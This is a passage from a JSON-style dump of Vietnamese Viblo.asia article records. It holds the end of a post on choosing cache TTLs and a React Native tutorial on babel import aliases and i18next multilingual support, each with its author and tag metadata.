di\u1ec5n \u0111\u01b0\u1ee3c.\n\nL\u00fd thuy\u1ebft c\u01a1 b\u1ea3n l\u00e0 v\u1eady. Th\u1ebf th\u1ef1c t\u1ebf th\u00ec b\u1ea1n s\u1ebd cache 1 item trong bao nhi\u00eau l\u00e2u? Ph\u1ea7n n\u00e0y kh\u00f4ng c\u00f3 c\u00e1ch n\u00e0o \u0111\u01b0a lu\u00f4n con s\u1ed1 c\u1ee5 th\u1ec3 m\u00e0 b\u1ea1n s\u1ebd ph\u1ea3i t\u1ef1 \u0111i t\u00ecm s\u1ef1 k\u1ebft h\u1ee3p ho\u00e0n h\u1ea3o cho h\u1ec7 th\u1ed1ng c\u1ee7a m\u00ecnh. M\u00ecnh ch\u1ec9 g\u1ee3i \u00fd 1 s\u1ed1 \u0111i\u1ec3m sau \u0111\u1ec3 c\u00e1c b\u1ea1n c\u00e2n nh\u1eafc:\n\n- \u0110i\u1ec1u ch\u1ec9nh cache TTL \u0111\u1ec3 cache hit ratio c\u00e0ng cao c\u00e0ng t\u1ed1t, th\u00f4ng th\u01b0\u1eddng m\u00ecnh s\u1ebd set m\u1ee9c cache hit ratio **t\u1ed1i thi\u1ec3u l\u00e0 85%**, m\u1ee9c **hi\u1ec7u qu\u1ea3 l\u00e0 > 90%**.\n- T\u0103ng cache TTL s\u1ebd \u0111i k\u00e8m c\u00e1i **gi\u00e1 v\u1ec1 storage**. \u0110\u1eebng c\u1ed1 g\u1eafng \u0111\u1ea9y cache TTL l\u00ean v\u1edbi 1 c\u00e1i gi\u00e1 storage qu\u00e1 \u0111\u1eaft. V\u00ed d\u1ee5 \u0111\u1ec3 t\u0103ng \u0111\u01b0\u1ee3c hit ratio t\u1eeb 88% l\u00ean 90% m\u00e0 ph\u1ea3i tr\u1ea3 b\u1eb1ng **3 l\u1ea7n memory size** th\u00ec kh\u00f4ng \u0111\u00e1ng.\n- Cache TTL n\u00ean \u0111\u01b0\u1ee3c d\u1ef1a tr\u00ean \u0111\u1ed9 **fresh** c\u1ee7a d\u1eef li\u1ec7u. T\u1ee9c l\u00e0 ta ch\u1ea5p nh\u1eadn \u0111\u1ed9 sai l\u1ec7ch d\u1eef li\u1ec7u trong bao l\u00e2u.\n- Cache nhi\u1ec1u khi \u0111\u01b0\u1ee3c d\u00f9ng \u0111\u1ec3 **throttle query v\u00e0o DB**. Do \u0111\u00f3 nhi\u1ec1u khi m\u00ecnh c\u00f3 th\u1ec3 ch\u1ec9 c\u1ea7n cache 5-10s l\u00e0 c\u00f3 th\u1ec3 h\u1ea1n ch\u1ebf peak query v\u00e0o DB cho nh\u1eefng d\u1eef li\u1ec7u hot r\u1ed3i.\n\nTh\u00f4ng th\u01b0\u1eddng th\u00ec cache TTL \u1edf backend application m\u00ecnh s\u1ebd set < 1 ng\u00e0y. Dao \u0111\u1ed9ng quanh kho\u1ea3ng **1 ph\u00fat ~> 30 ph\u00fat** l\u00e0 nhi\u1ec1u. Trong 1 v\u00e0i tr\u01b0\u1eddng h\u1ee3p m\u00ecnh set cache d\u00e0i l\u00ean t\u1edbi 6 gi\u1edd hay 1 ng\u00e0y th\u00ec m\u00ecnh s\u1ebd ph\u1ea3i implement th\u00eam **c\u00e1c c\u01a1 ch\u1ebf ch\u1ee7 \u0111\u1ed9ng invalidate cache** khi c\u00f3 thay \u0111\u1ed5i n\u1eefa.\n\n> **TIPs:** B\u1ea1n c\u00e0ng control \u0111\u01b0\u1ee3c vi\u1ec7c invalidate cache ch\u1ee7 \u0111\u1ed9ng th\u00ec c\u00e0ng d\u1ec5 \u0111\u1ec3 t\u0103ng cache TTL. M\u00ecnh c\u00f3 th\u1ec3 set cache TTL cho d\u1eef li\u1ec7u user tr\u00ean memory \u0111\u01b0\u1ee3c truy c\u1eadp nhi\u1ec1u nh\u1ea5t h\u1ec7 th\u1ed1ng l\u00ean t\u1edbi 1 ng\u00e0y v\u00ec c\u00f3 s\u1eed d\u1ee5ng c\u01a1 ch\u1ebf invalidate ch\u1ee7 \u0111\u1ed9ng khi c\u00f3 thay \u0111\u1ed5i data trong DB.\n\nCh\u1ed1t l\u1ea1i cho c\u00e2u h\u1ecfi n\u00e0y l\u00e0: **kh\u00f4ng c\u00f3 con s\u1ed1 n\u00e0o l\u00e0 ch\u00ednh x\u00e1c**, c\u0169ng **\u0111\u1eebng set 1 l\u1ea7n r\u1ed3i b\u1ecf \u0111\u00f3**, h\u00e3y **theo d\u00f5i cache hit ratio** v\u00e0 **storage size** \u0111\u1ec3 \u0111i\u1ec1u ch\u1ec9nh cho ph\u00f9 h\u1ee3p.\n\n## T\u1ed5ng k\u1ebft\n\nV\u1eady l\u00e0 ch\u00fang ta \u0111\u00e3 d\u1ea1o qua \u0111\u01b0\u1ee3c 3 c\u00e2u h\u1ecfi ch\u1ee7 y\u1ebfu khi s\u1eed d\u1ee5ng caching r\u1ed3i. \u0110\u00f3 ch\u00ednh l\u00e0:\n\n- Cache c\u00e1i g\u00ec?\n- Cache \u1edf \u0111\u00e2u?\n- Cache bao l\u00e2u?\n\nHy v\u1ecdng r\u1eb1ng qua b\u00e0i vi\u1ebft n\u00e0y c\u00e1c b\u1ea1n s\u1ebd c\u00f3 1 c\u00e1i nh\u00ecn khoa h\u1ecdc h\u01a1n v\u1edbi vi\u1ec7c s\u1eed d\u1ee5ng h\u1ec7 th\u1ed1ng v\u1eeba d\u1ec5 v\u1eeba kh\u00f3 l\u00e0 caching. Trong b\u00e0i vi\u1ebft sau v\u1edbi ti\u00eau \u0111\u1ec1: **Caching \u0111\u1ea1i ph\u00e1p 3: V\u1ea5n \u0111\u1ec1 v\u00e0 c\u00e1ch gi\u1ea3i quy\u1ebft** m\u00ecnh s\u1ebd \u0111\u1ec1 c\u1eadp t\u1edbi nh\u1eefng v\u1ea5n \u0111\u1ec1 khi s\u1eed d\u1ee5ng h\u1ec7 th\u1ed1ng caching v\u00e0 nh\u1eefng chi\u1ebfn l\u01b0\u1ee3c \u0111\u1ec3 gi\u1ea3i quy\u1ebft / gi\u1ea3m thi\u1ec3u \u1ea3nh h\u01b0\u1edfng c\u1ee7a n\u00f3. C\u00e1c b\u1ea1n h\u00e3y upvote, clip l\u1ea1i b\u00e0i vi\u1ebft n\u00e0y c\u0169ng nh\u01b0 c\u1ea3 series [**Caching \u0111\u1ea1i ph\u00e1p**](https://viblo.asia/s/caching-dai-phap-QqKLvpNbl7z) \u0111\u1ec3 c\u00f3 ngay th\u00f4ng b\u00e1o khi b\u00e0i vi\u1ebft ti\u1ebfp theo ra \u0111\u1eddi nh\u00e9.\n\nG\u00fat bai.",
      published_at: "2021-02-23 22:06:55",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 08:56:02",
      translation_source: null,
      trend_at: "2021-03-03 14:11:34",
      promoted_at: null,
      reading_time: 28,
      points: 65,
      views_count: 1947,
      clips_count: 31,
      comments_count: 12,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url:
        "https://images.viblo.asia/2d62ee9c-1087-4e9b-ab62-f7bcce789b12.jpg",
      user: {
        data: {
          id: 27607,
          url: "https://viblo.asia/u/monmen",
          avatar: "835402e9-e961-44f4-9ec4-d8d64d71b26b.jpg",
          name: "Minh Monmen",
          username: "monmen",
          followers_count: 617,
          reputation: 13541,
          posts_count: 30,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "redis",
            name: "Redis",
            primary: false,
            image:
              "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=Redis&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "in-memory-cache",
            name: "in-memory cache",
            primary: false,
            image:
              "https://placehold.jp/16/c0392b/ffffff/80x80.jpg?text=inmemory+cache&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "javascript",
            name: "JavaScript",
            primary: false,
            image:
              "https://placehold.jp/16/c0392b/ffffff/80x80.jpg?text=JavaScript&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "caching",
            name: "caching",
            primary: false,
            image:
              "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=caching&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "happy-new-year",
            name: "Happy New Year",
            primary: false,
            image:
              "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=Happy+New+Year&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [
          {
            id: 16586,
            url: "https://viblo.asia/u/dongthoigian4",
            avatar: "7a32b461-beea-4645-a410-94d06dab9ff8.jpg",
            name: "Quang Thi\u00ean",
            username: "dongthoigian4",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
          {
            id: 19754,
            url: "https://viblo.asia/u/socoladaica",
            avatar: "5ad5ad49-7d17-4121-88c7-51f3ca351247.jpg",
            name: "Socola \u0110\u1ea1i ca",
            username: "socoladaica",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
          {
            id: 27607,
            url: "https://viblo.asia/u/monmen",
            avatar: "835402e9-e961-44f4-9ec4-d8d64d71b26b.jpg",
            name: "Minh Monmen",
            username: "monmen",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
          {
            id: 29091,
            url: "https://viblo.asia/u/chungnq253",
            avatar: "60eb9d36-72ef-4f8a-b3ff-ac53a061064e.jpg",
            name: "Chung Nguy\u1ec5n Qu\u00e1n",
            username: "chungnq253",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
          {
            id: 45418,
            url: "https://viblo.asia/u/nhanvn1111",
            avatar: "310f6d0e-89a0-4699-8baa-6256afca4995.png",
            name: "Nhan Hoang Nguyen",
            username: "nhanvn1111",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
          {
            id: 45915,
            url: "https://viblo.asia/u/rekkun",
            avatar: "14b71504-7fab-4d4d-94c8-cd1d146bae3f.png",
            name: "Rek",
            username: "rekkun",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
        ],
      },
    },
    {
      id: 50932,
      title:
        "L\u00e0m \u1ee9ng d\u1ee5ng h\u1ecdc to\u00e1n \u0111\u01a1n gi\u1ea3n v\u1edbi React Native - Ph\u1ea7n 6",
      slug: "YWOZro2NlQ0",
      url:
        "https://viblo.asia/p/lam-ung-dung-hoc-toan-don-gian-voi-react-native-phan-6-YWOZro2NlQ0",
      user_id: 25945,
      moderation: null,
      transliterated: "lam-ung-dung-hoc-toan-don-gian-voi-react-native-phan-6",
      contents_short:
        "Ch\u00e0o c\u00e1c b\u1ea1n m\u1ed9t n\u0103m m\u1edbi an khang th\u1ecbnh v\u01b0\u1ee3ng, d\u1ed3i d\u00e0o s\u1ee9c kh\u1ecfe. L\u1ea1i l\u00e0 m\u00ecnh \u0111\u00e2y :) \u0110\u00e2y l\u00e0 link app m\u00e0 c\u00e1c b\u1ea1n \u0111ang theo d\u00f5i :3 https://play.google.com/store/apps/details?id=com.bloodycotech001, v\u00ec...",
      contents:
        "Ch\u00e0o c\u00e1c b\u1ea1n m\u1ed9t n\u0103m m\u1edbi an khang th\u1ecbnh v\u01b0\u1ee3ng, d\u1ed3i d\u00e0o s\u1ee9c kh\u1ecfe. L\u1ea1i l\u00e0 m\u00ecnh \u0111\u00e2y :) \u0110\u00e2y l\u00e0 link app m\u00e0 c\u00e1c b\u1ea1n \u0111ang theo d\u00f5i :3 https://play.google.com/store/apps/details?id=com.bloodycotech001, v\u00ec 1 s\u1ed1 l\u00fd do n\u00ean m\u00ecnh v\u1eabn ch\u01b0a update app k\u1ecbp nh\u1eefng g\u00ec c\u00f3 trong b\u00e0i vi\u1ebft. N\u1ebfu c\u00e1c b\u1ea1n c\u00f3 th\u1eddi gian, c\u00f3 th\u1ec3 cho m\u00ecnh xin 1 \u0111\u00e1nh gi\u00e1 ( bao nhi\u00eau sao c\u0169ng \u0111\u01b0\u1ee3c) v\u00e0 1 comment ch\u00e2n th\u00e0nh t\u1eeb c\u00e1c b\u1ea1n v\u1ec1 app ho\u1eb7c g\u00f3p \u00fd \u0111\u1ec3 app ph\u00e1t tri\u1ec3n h\u01a1n. M\u00ecnh s\u1ebd l\u1eafng nghe t\u1ea5t c\u1ea3 c\u00e1c g\u00f3p \u00fd v\u00e0 \u0111\u00e1nh gi\u00e1 c\u1ee7a t\u1ea5t c\u1ea3 c\u00e1c b\u1ea1n \u0111\u1ec3 d\u1ea7n ho\u00e0n thi\u1ec7n series h\u01b0\u1edbng d\u1eabn n\u00e0y c\u0169ng nh\u01b0 app ``happy math``\n\nM\u1ecdi ng\u01b0\u1eddi c\u00f3 th\u1ec3 theo d\u00f5i c\u00e1c ph\u1ea7n tr\u01b0\u1edbc c\u1ee7a m\u00ecnh t\u1ea1i \u0111\u00e2y\n\n**Ph\u1ea7n 1** [https://viblo.asia/p/lam-ung-dung-hoc-toan-don-gian-voi-react-native-63vKjzNVK2R]\n\n**Ph\u1ea7n 2** [https://viblo.asia/p/lam-ung-dung-hoc-toan-don-gian-voi-react-native-phan-2-RQqKLQv4Z7z]\n\n**Ph\u1ea7n 3** [https://viblo.asia/p/lam-ung-dung-hoc-toan-don-gian-voi-react-native-phan-3-Eb85oLMkK2G]\n\n**Ph\u1ea7n 4** [https://viblo.asia/p/lam-ung-dung-hoc-toan-don-gian-voi-react-native-phan-4-djeZ1ynGZWz]\n\n**Ph\u1ea7n 5** [https://viblo.asia/p/lam-ung-dung-hoc-toan-don-gian-voi-react-native-phan-5-E375z7NjKGW]\n\nPR nh\u1eb9 v\u1ea7y th\u00f4i, gi\u1edd v\u00e0o vi\u1ec7c lun n\u00e0o\n\n**1) Ch\u1ec9nh s\u1eeda babel.config.js**\n\nGi\u1edd review l\u1ea1i code m\u1ed9t t\u00ed nh\u00e9\n```\n//Battle.js\nimport {observer} from 'mobx-react';\nimport React, {useState, useEffect} from 'react';\nimport {StyleSheet, View, Dimensions} from 'react-native';\n\nimport {colors} from '../constants/theme';\nimport {useNavigation} from '@react-navigation/native';\nimport {StackRoute} from '../constants/route';\n\nimport WorkingSection from '../component/WorkingSection';\nimport AnswerButton from '../component/AnswerButton';\nimport PointSection from '../component/PointSection';\nimport BattleStore from '../stores/battleStore';\n```\n\nKhi nh\u00ecn v\u00e0o c\u00e1i d\u1ea5u ``../`` n\u00e0y, ho\u1eb7c v\u00ed d\u1ee5, khi ch\u00fang ta ph\u1ea3i import 1 component ch\u00e1u ch\u1eaft v\u00e0o 1 component ch\u00e1u ch\u1eaft c\u1ee7a 1 folder kh\u00e1c, v\u00e0 ch\u00fang ta ph\u1ea3i import n\u00f3 nh\u01b0 th\u1ebf n\u00e0y ``../../../../ComponenNaoDo`` th\u00ec m\u1ecdi ng\u01b0\u1eddi c\u00f3 th\u1ea5y \u1ee9c ch\u1ebf nh\u01b0 m\u00ecnh kh\u00f4ng nh\u1ec9 ?\n\nCh\u00fang ta \u0111ang l\u00e0m 1 app nh\u1ecf, n\u00ean vi\u1ec7c import chay th\u1ebf n\u00e0y c\u0169ng kh\u00f4ng \u1ea3nh h\u01b0\u1edfng qu\u00e1 nhi\u1ec1u \u0111\u1ebfn code c\u1ee7a b\u1ea1n, nh\u01b0ng khi c\u00e1i app nh\u1ecf c\u1ee7a ch\u00fang ta l\u1edbn d\u1ea7n, ch\u00fang ta ph\u1ea3i thay \u0111\u1ed5i nhi\u1ec1u th\u1ee9, di chuy\u1ec3n module n\u00e0y qua ch\u1ed7 n\u00e0y, di chuy\u1ec3n module kia ra ngo\u00e0i module kh\u00e1c, ...v...v... v\u00e2n v\u00e2n v\u00e0 m\u00e2y m\u00e2y, th\u00ec c\u00e1i vi\u1ec7c import nh\u1ecf x\u00edu nh\u01b0 v\u1eady \u0111\u00f4i khi l\u1ea1i ch\u00ednh l\u00e0 nguy\u00ean do l\u00e0m ta m\u1ea5t c\u1ea3 n\u1eeda ng\u00e0y tr\u1eddi \u0111\u1ec3 ch\u1ec9nh l\u1ea1i t\u1eebng c\u00e1i import (nghe th\u1ed1n nh\u1ec9). N\u1ebfu b\u1ea1n ch\u01b0a m\u01b0\u1eddng t\u01b0\u1ee3ng \u0111\u01b0\u1ee3c c\u00e1i vi\u1ec7c th\u1ed1n \u0111\u00f3, th\u00ec \u0111\u1ec3 m\u00ecnh l\u1ea5y v\u00ed d\u1ee5 nh\u00e9, b\u1ea1n c\u00f3 file Battle.js \u1edf tr\u00ean, n\u00f3 n\u1eb1m trong folder screen, v\u00e0 n\u00f3 c\u1ea7n import route \u1edf trong folder constants, v\u00e0 b\u1ea1n c\u1ea7n import nh\u01b0 th\u1ebf n\u00e0y ``import {StackRoute} from '../constants/route';``, v\u00e0o 1 ng\u00e0y \u0111\u1eb9p tr\u1eddi, m\u00ecnh c\u1ea7n move c\u00e1i Battle.js ra ngo\u00e0i screen, v\u00e0 m\u00ecnh c\u1ea7n update l\u1ea1i c\u00e1i import StackRoute l\u00e0 ``import {StackRoute} from './constants/route';`` v\u00e0 t\u1ea5t c\u1ea3 nh\u1eefng c\u00e1i import kh\u00e1c \u0111\u1ec1u ph\u1ea3i v\u1eady, \u0111i\u1ec1u \u0111\u00f3 c\u1ef1c k\u00ec b\u1ea5t ti\u1ec7n khi m\u00ecnh c\u1ea7n di chuy\u1ec3n nhi\u1ec1u folder hay file kh\u00e1c. Tuy nhi\u00ean b\u1eb1ng c\u00e1ch config l\u1ea1i file babel.config.js th\u00ec c\u00f3 th\u1ec3 gi\u1ea3i quy\u1ebft v\u1ea5n \u0111\u1ec1 \u0111\u00f3, c\u00e1c b\u1ea1n c\u00f3 th\u1ec3 tham kh\u1ea3o: \n```\nmodule.exports = api => {\n  api.cache(true);\n  return {\n    presets: ['module:metro-react-native-babel-preset'],\n    plugins: [\n      ['@babel/plugin-proposal-decorators', { legacy: true }],\n      [\n        'module-resolver',\n        {\n          root: ['src'],\n          extensions: ['.js'],\n        },\n      ],\n    ],\n  };\n};\n```\nC\u00e0i \u0111\u1eb7t th\u00eam c\u00e1c ``metro-react-native-babel-preset`` v\u00e0 ``module-resolver``, gi\u1edd ph\u1ea7n import c\u1ee7a Battle.js n\u00f3 s\u1ebd \u0111\u1eb9p nh\u01b0 v\u1eady\n```\n//Battle.js\nimport {observer} from 'mobx-react';\nimport React, {useState, useEffect} from 'react';\nimport {StyleSheet, View, Dimensions} from 'react-native';\n\nimport {colors} from 'constants/theme';\nimport {useNavigation} from '@react-navigation/native';\nimport {StackRoute} from 'constants/route';\n\nimport WorkingSection from 'component/WorkingSection';\nimport AnswerButton from 'component/AnswerButton';\nimport PointSection from 'component/PointSection';\nimport BattleStore from 'stores/battleStore';\n```\nGi\u1edd b\u1ea1n c\u1ea7m file n\u00e0y \u0111i ch\u1ed7 n\u00e0o c\u0169ng kh\u00f4ng c\u1ea7n s\u1eeda l\u1ea1i ph\u1ea7n import c\u1ee7a n\u00f3 c\u1ea3\n\n**2) Ch\u1ee9c n\u0103ng \u0111a ng\u00f4n ng\u1eef trong React Native**\n\nV\u00ec mong mu\u1ed1n app c\u1ee7a m\u00ecnh c\u00f3 th\u1ec3 ph\u1ed5 bi\u1ebfn r\u1ed9ng r\u00e3i tr\u00ean to\u00e0n th\u1ebf gi\u1edbi (yaoming) n\u00ean m\u00ecnh s\u1ebd th\u00eam ch\u1ee9c n\u0103ng \u0111a ng\u00f4n ng\u1eef cho n\u00f3. \u0110\u1ed1i v\u1edbi 1 s\u1ed1 b\u1ea1n c\u00f3 th\u1ec3 ph\u1ea7n n\u00e0y c\u00f2n h\u01a1i l\u1ea1 l\u1eabm, nh\u01b0ng kh\u00f4ng sao, x\u00e0i n\u00f3 d\u1ec5 l\u1eafm. Vi\u1ec7c s\u1eed d\u1ee5ng i18n v\u00e0o react app gi\u1ed1ng nh\u01b0 ta inject 1 store v\u00e0o app, nh\u01b0ng store \u0111\u00f3 ch\u1ec9 ch\u1ee9a d\u1eef li\u1ec7u v\u1ec1 ng\u00f4n ng\u1eef th\u00f4i. N\u00f3 s\u1ebd gi\u00fap ch\u00fang ta \u0111\u1ed5i ng\u00f4n ng\u1eef t\u1eeb ti\u1ebfng m\u1eb9 \u0111\u1ebb sang ti\u1ebfng Kinh cho to\u00e0n App ch\u1ec9 trong 1 n\u00fat b\u1ea5m (lol)\nTr\u01b0\u1edbc ti\u00ean ph\u1ea3i c\u00e0i \u0111\u1eb7t c\u00e1c library c\u1ea7n thi\u1ebft \u0111\u00e3: ``npm install --save i18next react-i18next react-native-localize`` v\u00ec \u0111\u00e2y l\u00e0 react-native n\u00ean b\u1ea1n n\u00ean c\u00e0i \u0111\u1ee7 3 th\u1eb1ng n\u00e0y.\nSau \u0111\u00f3 t\u1ea1o 1 folder l\u00e0 i18n, t\u1ea1o ra 1 file index.js v\u00e0 copy code sau \n```\nimport i18n from 'i18next';\nimport { initReactI18next } from 'react-i18next';\nimport { getLocales } from 'react-native-localize';\n\ni18n.use(initReactI18next).init({\n  lng: getLocales()[0].languageCode,\n  fallbackLng: 'en',\n  resources: {\n    en: {\n      translation: {\n        hello: 'Hello',\n      },\n    },\n    vi: {\n      translation: {\n        hello: 'Xin ch\u00e0o',\n      },\n    },\n  },\n});\nexport default i18n;\n```\nR\u1ed3i qua file App.js, import n\u00f3 v\u00e0o nh\u01b0 sau: \n```\nimport 'react-native-gesture-handler';\nimport * as React from 'react';\nimport { NavigationContainer } from '@react-navigation/native';\nimport i18n from './src/i18n/index';\n\nimport DefaultStack from './src/navigation/defaultStack';\nconst initI18n = i18n;\n\nexport default function App() {\n  return (\n    <NavigationContainer>\n      <DefaultStack />\n    </NavigationContainer>\n  );\n}\n```\nC\u00f3 th\u1ec3 c\u00e1c b\u1ea1n s\u1ebd th\u1eafc m\u1eafc ``initI18n`` m\u00ecnh c\u00f3 d\u00f9ng g\u00ec \u0111\u00e2u, m\u00e0 sao l\u1ea1i khai b\u00e1o ch\u1ed7 n\u00e0y nh\u1ec9, c\u00f3 nh\u1ea7m g\u00ec kh\u00f4ng? \u00c0 th\u1eadt ra l\u00e0 kh\u00f4ng \u0111\u00e2u, ch\u00fang ta khai b\u00e1o nh\u01b0 v\u1eady th\u00ec n\u00f3 m\u1edbi kh\u1edfi t\u1ea1o i18n cho ch\u00fang ta x\u00e0i v\u00e0o App, n\u00ean \u0111\u1eebng qu\u00ean nh\u00e9.\n\nKhi d\u00f9ng i18n c\u0169ng r\u1ea5t \u0111\u01a1n gi\u1ea3n th\u00f4i.\n```\n// import th\u01b0 vi\u1ec7n v\u00e0o\nimport { useTranslation } from 'react-i18next';\n// l\u1ea5y function t c\u1ee7a n\u00f3 ra d\u00f9ng, l\u01b0u \u00fd l\u00e0 c\u00e1i n\u00e0y ch\u1ec9 x\u00e0i trong function component th\u00f4i nh\u00e9.\nconst { t } = useTranslation();\n\n// v\u00e0 s\u1eed d\u1ee5ng n\u00f3 \u1edf n\u01a1i b\u1ea1n mu\u1ed1n\nt('hello') // hello n\u00e0y ng\u00f4n ng\u1eef English s\u1ebd l\u00e0 hello, ti\u1ebfng vi\u1ec7t s\u1ebd l\u00e0 Xin ch\u00e0o.\n```\n\nC\u00e1c b\u1ea1n c\u00f3 th\u1ec3 define nhi\u1ec1u \u0111o\u1ea1n text kh\u00e1c, nh\u01b0 l\u00e0:\n```\n  en: {\n      translation: {\n        welcome: {\n            title1: 'Learn',\n            title2: 'Math',\n            practice: 'practice',\n            battle: 'battle',\n          },\n      },\n    },\n```\nC\u00f3 th\u1ec3 vi\u1ebft th\u1eb3ng trong file index.js ho\u1eb7c chia ra 1 file en.js ri\u00eang v\u00e0 export ra 1 object nh\u01b0 sau:\n```\nconst English = {\n  welcome: {\n    title1: 'Learn',\n    title2: 'Math',\n    practice: 'practice',\n    battle: 'battle',\n  }\n};\n\nexport default English;\n```\nR\u1ed3i cho n\u00f3 v\u00e0o b\u1eb1ng spread operator\n```\n  en: {\n      translation: {\n        ...English\n      },\n    },\n```\nC\u00e1c b\u1ea1n l\u00e0m t\u01b0\u01a1ng t\u1ef1 v\u1edbi file Vietnamese l\u00e0 ok. N\u1ebfu mu\u1ed1n thay \u0111\u1ed5i ng\u00f4n ng\u1eef, th\u00ec b\u1ea1n c\u1ea7n d\u00f9ng function c\u1ee7a i18next, docs c\u1ee7a e n\u00f3 \u0111\u00e2y https://www.i18next.com/overview/api#changelanguage, N\u1ebfu v\u1eabn kh\u00f4ng hi\u1ec3u th\u00ec coi code m\u1eabu c\u00f9a m\u00ecnh cho \u0111\u01a1n gi\u1ea3n c\u0169ng dc:\n```\n// V\u00ed d\u1ee5 n\u00e0y m\u00ecnh \u0111\u00e3 r\u00fat g\u1ecdn r\u1ed3i nh\u00e9, copy y nguy\u00ean m\u00e0 kh\u00f4ng s\u1eeda l\u00e0 kh\u00f4ng ch\u1ea1y \u0111\u00e2u\nimport i18n from 'i18next';\nimport { useTranslation } from 'react-i18next';\n\nconst SetLanguageScreen = observer(() => {\n  const { t } = useTranslation();\n  const Navigate = useNavigation();\n\n  return (\n      <>\n          <TouchableHighlight\n            style={styles.imageContainer}\n            onPress={() => i18n.changeLanguage('en', () => {})}>\n            {t('changeLanguageEnglish')}\n          </TouchableHighlight>\n           <TouchableHighlight\n            style={styles.imageContainer}\n            onPress={() => i18n.changeLanguage('vi', () => {})}>\n            {t('changeLanguageVietnamese')}\n          </TouchableHighlight>\n     </>\n    );\n});\n\nexport default SetLanguageScreen;\n```\n\nV\u1ea7y l\u00e0 ch\u00fang ta \u0111\u00e3 apply xong ph\u1ea7n \u0111a ng\u00f4n ng\u1eef r\u1ed3i.\n\n**3) Update giao di\u1ec7n**\n\n Gi\u1edd t\u1edbi ph\u1ea7n giao di\u1ec7n cho n\u00f3, m\u00ecnh s\u1ebd l\u00e0m 1 c\u00e1i n\u00fat nh\u1ecf nh\u1ecf \u1edf m\u00e0n h\u00ecnh welcome, khi b\u1ea5m v\u00e0o n\u00f3 s\u1ebd chuy\u1ec3n \u0111\u1ebfn m\u00e0n h\u00ecnh ch\u1ecdn ng\u00f4n ng\u1eef cho app, m\u00ecnh s\u1ebd t\u1ea1o 2 option l\u00e0 ti\u1ebfng Vi\u1ec7t ho\u1eb7c English th\u00f4i\n \n ![](https://images.viblo.asia/6c6c54c9-b4af-4a8c-85e0-22874bba1e45.jpg)\n\n\n M\u00ecnh \u0111\u1ec3 t\u00ean app th\u00e0nh Learn Math v\u00e0 H\u1ecdc To\u00e1n, v\u00ec n\u1ebfu happy Math m\u00e0 d\u1ecbch sang ti\u1ebfng vi\u1ec7t nghe n\u00f3 ph\u00ea c\u1ea7n l\u1eafm (To\u00e1n vui v\u1ebb hay vui v\u1ebb To\u00e1n ?). C\u00e1i n\u00fat m\u00ecnh \u0111\u1ec3 h\u01a1i x\u1ea5u, s\u1ebd update l\u1ea1i sau n\u00e0y v\u1edbi 1 ph\u1ea7n setting ho\u00e0nh tr\u00e1ng h\u01a1n  \n \n Ti\u1ec7n \u0111\u00e2y th\u00ec ch\u00fang ta x\u00e0i th\u1eed lu\u00f4n nha.\n \n B\u1ea5m v\u00e0o m\u00e0n h\u00ecnh ch\u1ecdn ng\u00f4n ng\u1eef\n ![](https://images.viblo.asia/44f43796-4051-43c2-bf06-35107b644534.jpg)\n\u0110ang l\u00e0 ti\u1ebfng Vi\u1ec7t, ch\u00fang ta chuy\u1ec3n qua English nh\u00e9\n![](https://images.viblo.asia/6e22a579-e74d-462e-9a46-79aa9d1dd007.jpg)\nR\u1ed3i b\u1ea5m n\u00fat Play \u0111\u1ec3 back l\u1ea1i trang home\n![](https://images.viblo.asia/33a8bce2-1322-45a5-9e4a-fdda6a7d3b68.jpg)\nV\u00e0o Practice \u0111\u1ec3 ch\u01a1i v\u00e0 ch\u1ecdn th\u1eddi gian, v\u00e0 v\u1edbi t\u1eebng lo\u1ea1i ng\u00f4n ng\u1eef, ch\u00fang ta c\u1ed1 th\u1ec3 th\u1ea5y r\u1ea5t r\u00f5 c\u00f3 2 s\u1ef1 kh\u00e1c bi\u1ec7t l\u1edbn:\n\nVi\u1ec7t Nam:\n ![](https://images.viblo.asia/5f616246-06eb-4912-a72a-ece703361d84.jpg)\n\nEnglish:\n ![](https://images.viblo.asia/cbe2ba98-cc93-4e48-a31a-30fe11cfdcfd.jpg)\n \nL\u1ea7n update n\u00e0y m\u00ecnh t\u1ea1m d\u1eebng \u0111\u1ebfn \u0111\u00e2y th\u00f4i, c\u1ea3m \u01a1n c\u00e1c b\u1ea1n \u0111\u00e3 theo d\u00f5i b\u00e0i vi\u1ebft c\u1ee7a m\u00ecnh, xin ch\u00e0o v\u00e0 h\u1eb9n g\u1eb7p l\u1ea1i c\u00e1c b\u1ea1n trong c\u00e1c b\u00e0i vi\u1ebft sau /(^.^)/\n\n**P/S**\n\nC\u00e1c b\u1ea1n c\u00f3 th\u1ec3 theo d\u00f5i full series c\u1ee7a m\u00ecnh t\u1ea1i \u0111\u00e2y: \nhttps://viblo.asia/s/lam-ung-dung-hoc-toan-don-gian-voi-react-native-375z0mxPZGW\nM\u00ecnh \u0111\u00e3 upload app l\u00ean Google store, c\u00e1c b\u1ea1n c\u00f3 th\u1ec3 t\u1ea3i v\u1ec1 xem tr\u01b0\u1edbc, t\u00ean app m\u00ecnh c\u00f3 h\u01a1i thay \u0111\u1ed5i 1 t\u00ed, mong m\u1ecdi ng\u01b0\u1eddi v\u1eabn \u1ee7ng h\u1ed9 series c\u1ee7a m\u00ecnh\n\n**Link app :** https://play.google.com/store/apps/details?id=com.bloodycotech001\n\nXin ch\u00e2n th\u00e0nh c\u1ea3m \u01a1n c\u00e1c b\u1ea1n!!! <3 